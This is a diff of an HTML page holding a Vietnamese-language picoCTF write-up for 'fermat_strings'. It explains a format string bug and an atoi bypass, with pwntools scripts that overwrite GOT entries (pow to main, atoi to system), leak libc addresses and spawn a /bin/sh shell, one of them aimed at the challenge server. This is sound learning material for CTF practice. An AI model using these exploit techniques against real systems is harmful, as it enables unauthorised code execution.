@@ -165,6 +165,89 @@
                     <main>
                         <h1 id="fermat_strins"><a class="header" href="#fermat_strins">fermat_strins</a></h1>
 <p>Oke, bài này hmmm khá hay với mình, tại vì nó tổng hợp những kiến thức mình học được 1 cách rời rạc vào cùng 1 bài. </p>
+<h3 id="file"><a class="header" href="#file">file</a></h3>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings$ file chall
+chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=964ca3b1c1c143aa765fc3c0aa4552bb6ec4cb08, not stripped
+
+</code></pre>
+<h3 id="source"><a class="header" href="#source">source</a></h3>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;math.h&gt;
+
+#define SIZE 0x100
+
+int main(void)
+{
+  char A[SIZE];
+  char B[SIZE];
+
+  int a = 0;
+  int b = 0;
+
+  puts(&quot;Welcome to Fermat\\'s Last Theorem as a service&quot;);
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  printf(&quot;A: &quot;);
+  read(0, A, SIZE);
+  printf(&quot;B: &quot;);
+  read(0, B, SIZE);
+
+  A[strcspn(A, &quot;\n&quot;)] = 0; // return len 
+  B[strcspn(B, &quot;\n&quot;)] = 0; // B[len] = 0 ???, maybe it like null byte :))
+
+  a = atoi(A);
+  b = atoi(B); // convert to int
+
+  if(a == 0 || b == 0) {
+    puts(&quot;Error: could not parse numbers!&quot;);
+    return 1;
+  }
+
+  char buffer[SIZE];
+  snprintf(buffer, SIZE, &quot;Calculating for A: %s and B: %s\n&quot;, A, B);
+  printf(buffer);
+
+  int answer = -1;
+  for(int i = 0; i &lt; 100; i++) {
+    if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
+      answer = i;
+    }
+  }
+
+  if(answer != -1) printf(&quot;Found the answer: %d\n&quot;, answer);
+}
+
+</code></pre>
+<h3 id="info-func"><a class="header" href="#info-func">info func</a></h3>
+<p><strong>strcspn(str1,str2)</strong> : hàm này trả về số kí tự trong str1 mà không xuất hiện kí tự nào trong str2. Ở source trên thì làm nhiệm vụ thay kí tự xuống dòng thành null byte</p>
+<p><strong>snprintf()</strong> : trả về số kí tự đã được ghi vào buffer</p>
+<h3 id="bug"><a class="header" href="#bug">bug</a></h3>
+<p>ở đây ta có thể thấy là lỗi format string, tuy nhiên thì trước đấy có 1 cái filter trá hình là <strong>atoi()</strong> thằng oắt này sẽ convert sang số, và nếu kết quả = 0, tức không convert được thì tiu. So, chúng ta cần bypass chỗ này, giờ thì xem thg atoi nó thật sự làm cái gì </p>
+<blockquote>
+<p>int atoi (const char * str);</p>
+<blockquote>
+<p>Convert string to integer
+Parses the C-string str interpreting its content as an integral number, which is returned as a value of type int.</p>
+<p>The function first discards as many whitespace characters (as in isspace) as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many base-10 digits as possible, and interprets them as a numerical value.</p>
+<p>The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.</p>
+<p>If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed and zero is returned.</p>
+</blockquote>
+</blockquote>
+<p>Đại khái có thể hiểu là nó chỉ convert các chữ số trong 1 string thành int và kệ mấy cái kí tự khác, miễn là kí tự đầu tiên phải là số. EX: atoi(1a2) = 1</p>
+<p>Kịch bản khai thác đại khái sẽ như sau:</p>
+<ul>
+<li>payload khai thác có dạng 1_blabla_for_exploit</li>
+<li>Lợi dụng format string để overwrite got của pow =&gt; main để có thể tiến hành gửi payload nhiều lần dễ dàng</li>
+<li>Leak ra được địa chỉ runtime của các hàm nào đấy để tính libc base, tuy nhiên cần xác định được thư viện sử dụng là gì </li>
+<li>overwrite got của atoi =&gt; system, bởi có chỗ gọi atoi(A) , lúc này ghi A = &quot;/bin/sh&quot; =&gt; lấy shell</li>
+</ul>
+<h3 id="overwrite-pow-got-to-main-address"><a class="header" href="#overwrite-pow-got-to-main-address">overwrite pow GOT to main address</a></h3>
 <pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/Pico/fermat_strings$ python3 exploit_pow_main.py
 [*] '/mnt/d/pwn_myself/Pico/fermat_strings/chall'
     Arch:     amd64-64-little
@@ -225,8 +308,10 @@ r.sendlineafter(b&quot;B: &quot;,payload2)
 
 r.interactive()
 
-
 </code></pre>
+<p>Vấn đề tại sao lại trừ 46 í, thì là do cơ chế ghi với formatstring là sẽ in ra màn hình 15 kí tự đi ha rồi sẽ ghi giá trị hex(15) vào địa chỉ ở tham số chỉ định. mà trước đó đã in ra &quot;blabla&quot; tổng 46 kí tự rồi nên giờ phải trừ ra.</p>
+<p>Thêm vấn đề là tại sao là tham số thứ 11 thì, chuỗi mình ghi vào sẽ bắt đầu ở tham số thứ 10, cứ check là được :))</p>
+<h3 id="leak-libc-base-and-determine-libc-version"><a class="header" href="#leak-libc-base-and-determine-libc-version">leak libc base, and determine libc version</a></h3>
 <pre><code class="language-python">from pwn import *
 
 binary = ELF(&quot;chall&quot;)
@@ -250,32 +335,27 @@ def send_format(r, format, values):
 
 log.info(f&quot;puts() GOT address: {hex(binary.got['puts'])}&quot;)
 
-fmt_first_offset = 43
-puts_offset_libc = binary.plt['puts']
-
-
-output = send_format(r, b&quot;%43$s.%44$s.&quot;, p64(binary.got[&quot;puts&quot;]) + p64(binary.got[&quot;atoi&quot;]))
+output = send_format(r, b&quot;%43$s.%44$s.%45$s.&quot;, p64(binary.got[&quot;puts&quot;]) + p64(binary.got[&quot;atoi&quot;])+ p64(binary.got[&quot;strcspn&quot;]))
 
 print(output)
 
 puts_addr_str = output.split(b'.')[0].ljust(8, b'\x00')
 atoi_addr_str = output.split(b&quot;.&quot;)[1].ljust(8, b'\x00')
+strcspn_addr_str = output.split(b&quot;.&quot;)[2].ljust(8, b'\x00')
+
 puts_addr = int.from_bytes(puts_addr_str, &quot;little&quot;) 
 atoi_addr = int.from_bytes(atoi_addr_str, &quot;little&quot;) 
+strcspn_addr = int.from_bytes(strcspn_addr_str, &quot;little&quot;) 
 
 log.info(f&quot;puts() runtime address: {hex(puts_addr)}\n&quot;)
-
 log.info(f&quot;atoi() runtime address: {hex(atoi_addr)}\n&quot;)
-
-
-libc_base_addr = u64(puts_addr_str) - puts_offset_libc
-log.info(f&quot;libc_base address: {hex(libc_base_addr)}\n&quot;)
+log.info(f&quot;strcspn() runtime address: {hex(strcspn_addr)}\n&quot;)
 
 r.interactive()
 
-
-
 </code></pre>
+<p>Oke thì mình vẫn chưa solve được trên remote do mình vẫn chưa xác định được libc mà remote sử dụng, bài này có cho mình 1 file docker tuy nhiên mình là không biết build thế nào nên là, đợi mình học tí docker rồi quay lại đây :(. trước mắt thì mình cứ solve trên local trước đã.</p>
+<h3 id="overwrite-atoi_got--system-for-the-next-call-main"><a class="header" href="#overwrite-atoi_got--system-for-the-next-call-main">overwrite atoi_got =&gt; system for the next call main</a></h3>
 <pre><code class="language-python">from pwn import *
 
 binary = ELF(&quot;chall&quot;)
@@ -309,6 +389,149 @@ payload2 += str(int(system_addr_medium) - int(system_addr_low)).encode(&quot;asc
 
 r.sendlineafter(b&quot;B: &quot;,payload2)
 
+r.interactive()
+
+
+</code></pre>
+<h3 id="full-solve-code-on-local"><a class="header" href="#full-solve-code-on-local">full solve code on local</a></h3>
+<pre><code class="language-python">from pwn import *
+
+binary = ELF(&quot;chall&quot;)
+#r = process(&quot;./chall&quot;)
+
+
+
+if not args.REMOTE:
+    r = process(binary.path)
+    gdb.attach(r, api = True)
+    libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;)
+else:
+    r = remote('mars.picoctf.net', 31929)
+    #libc = ELF(&quot;./libc6_2.31-0ubuntu9.1_amd64.so&quot;)
+
+
+pow_got = binary.got['pow']
+main_addr = binary.symbols['main']
+
+log.info(f&quot;Main address: {hex(main_addr)}&quot;) # 0x400837
+log.info(f&quot;pow() GOT address: {hex(pow_got)}&quot;) # 0x601040
+
+payload1 = b&quot;11111111&quot; + p64(pow_got) #+ p64(pow_got+4)
+
+r.sendlineafter(b&quot;A: &quot;,payload1)
+
+#payload2 = b&quot;1_______%1p%11$n--------&quot;
+payload2 = b&quot;1_______%&quot; + str(int(main_addr) - 46).encode(&quot;ascii&quot;) + b&quot;p%11$n--&quot; #4196361
+
+r.sendlineafter(b&quot;B: &quot;,payload2)
+
+r.recvuntil(&quot;Calculating for A: &quot;)
+log.info(&quot;rewrote pow GOT to main&quot;)
+
+######################################
+
+def send_payload(r, a, b):
+    log.info(f&quot;Sending:\nA:\n{a}\nB:\n{hexdump(b)}&quot;)
+    r.sendlineafter(&quot;A: &quot;, a)
+    r.sendlineafter(&quot;B: &quot;, b)
+
+def send_format(r, format, values):
+    format_prefix = b'1_______'
+    values_prefix = b'1_______'
+    send_payload(r, format_prefix + format, values_prefix + values)
+    out = r.recvline()
+    arr = out.split(b&quot; and &quot;)
+    res = arr[0].replace(b&quot;Calculating for A: &quot; + format_prefix, b&quot;&quot;)
+    log.info(f&quot;Received:\n{hexdump(res)}&quot;)
+    return res
+
+log.info(f&quot;puts() GOT address: {hex(binary.got['puts'])}&quot;)
+
+fmt_first_offset = 43
+puts_offset_libc = libc.symbols[&quot;puts&quot;] #0x0875a0
+
+
+output = send_format(r, b&quot;%43$s.%44$s.&quot;, p64(binary.got[&quot;puts&quot;]) + p64(binary.got[&quot;atoi&quot;]))
+
+print(output)
+
+puts_addr_str = output.split(b'.')[0].ljust(8, b'\x00')
+atoi_addr_str = output.split(b&quot;.&quot;)[1].ljust(8, b'\x00')
+puts_addr = int.from_bytes(puts_addr_str, &quot;little&quot;) 
+atoi_addr = int.from_bytes(atoi_addr_str, &quot;little&quot;) 
+
+log.info(f&quot;puts() runtime address: {hex(puts_addr)}\n&quot;)
+
+log.info(f&quot;atoi() runtime address: {hex(atoi_addr)}\n&quot;)
+
+
+libc_base_addr = u64(puts_addr_str) - puts_offset_libc
+log.info(f&quot;libc_base address: {hex(libc_base_addr)}\n&quot;)
+
+system_offset = libc.symbols['system'] #0x055410
+system_addr = libc_base_addr + system_offset
+log.info(f&quot;system address: {hex(system_addr)}\n&quot;) # demo 0x7fe0e8abc570
+
+##########################################################
+
+
+atoi_got = binary.got['atoi']
+
+log.info(f&quot;atoi() GOT address: {hex(atoi_got)}&quot;) 
+
+
+#system_addr = 0x7fe0e8abc570 #demo
+
+system_addr_high = (system_addr &gt;&gt; 32) &amp; 0xFFFF
+system_addr_medium = (system_addr &gt;&gt; 16) &amp; 0xFFFF
+system_addr_low = system_addr &amp; 0xFFFF
+
+print(&quot;Original values:&quot;)
+print(&quot;High:&quot;, int(system_addr_high))
+print(&quot;Medium:&quot;, int(system_addr_medium))
+print(&quot;Low:&quot;, int(system_addr_low))
+
+# Đưa các giá trị vào một danh sách
+values = [
+    (&quot;high&quot;, system_addr_high, &quot;13&quot; ),
+    (&quot;medium&quot;, system_addr_medium, &quot;12&quot; ),
+    (&quot;low&quot;, system_addr_low, &quot;11&quot;)
+]
+
+# Sắp xếp danh sách dựa trên giá trị
+values.sort(key=lambda x: x[1])
+
+print(&quot;\nSorted values:&quot;)
+
+for item in values:
+    print(item[0] + &quot;:&quot; , item[1] , item[2] )
+
+
+payload1 = b&quot;11111111&quot; + p64(atoi_got ) + p64(atoi_got + 2 ) + p64(atoi_got + 4)
+
+r.sendlineafter(b&quot;A: &quot;,payload1)
+
+#payload2 = b&quot;1_______%1p%12$n%2p%11$n&quot;
+
+# payload2 = b&quot;1_______%&quot; + str(int(system_addr_high) - 46).encode(&quot;ascii&quot;) + b&quot;p%13$hn%&quot; 
+# payload2 += str(int(system_addr_low) - int(system_addr_high)).encode(&quot;ascii&quot;) + b&quot;p%11$hn%&quot;
+# payload2 += str(int(system_addr_medium) - int(system_addr_low)).encode(&quot;ascii&quot;) + b&quot;p%12$hn--&quot; 
+payload2 = b&quot;1_______%&quot; + str(values[0][1] - 46).encode(&quot;ascii&quot;) + b&quot;p%&quot; + values[0][2].encode(&quot;ascii&quot;) + b&quot;$hn%&quot; 
+payload2 += str(values[1][1] - values[0][1]).encode(&quot;ascii&quot;) + b&quot;p%&quot;+ values[1][2].encode(&quot;ascii&quot;) + b&quot;$hn%&quot;
+payload2 += str(values[2][1] - values[1][1]).encode(&quot;ascii&quot;) + b&quot;p%&quot;+ values[2][2].encode(&quot;ascii&quot;) + b&quot;$hn--&quot; 
+
+r.sendlineafter(b&quot;B: &quot;,payload2)
+
+##################################
+
+r.recvuntil(&quot;Calculating for A: &quot;)
+log.info(&quot;rewrote atoi GOT to system&quot;)
+
+payload1 = b&quot;/bin/sh\x00&quot;
+r.sendlineafter(b&quot;A: &quot;,payload1)
+payload2 = b&quot;/sh&quot;
+r.sendlineafter(b&quot;B: &quot;,payload2)
+                
 r.interactive()
 
 
